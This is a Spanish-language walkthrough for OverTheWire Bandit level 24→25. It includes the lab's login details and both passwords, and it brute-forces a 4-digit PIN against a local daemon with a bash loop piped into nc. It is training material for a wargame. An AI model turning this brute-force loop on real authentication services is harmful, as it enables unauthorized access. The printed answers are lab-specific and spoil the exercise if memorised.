# Bandit Level 24 → Level 25

## Objetivo
Un demonio está escuchando en el puerto 30002 y le dará la contraseña para Bandit25 si se le da la contraseña de Bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código pin, excepto pasando por todos los 10000 combinaciones, llamadas fuerza bruta.  
No es necesario crear nuevas conexiones cada vez.

## Datos de acceso al nivel
* Servidor: ssh bandit24@bandit.labs.overthewire.org
* Usuario: bandit24
* Contraseña: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solución
``` bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
1234
Fail! You did not supply enough data. Try again.
159753
Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d'
Exiting.
bandit24@bandit:~$
```

## Notas Adicionales
* *{0000..9999}:* expresión que se encarga de crear un PIN de 4 dígitos, partiendo de 0000 hasta llegar a 9999.

## Referencias
* [Ninguna]

Fecha: 28/02/2023.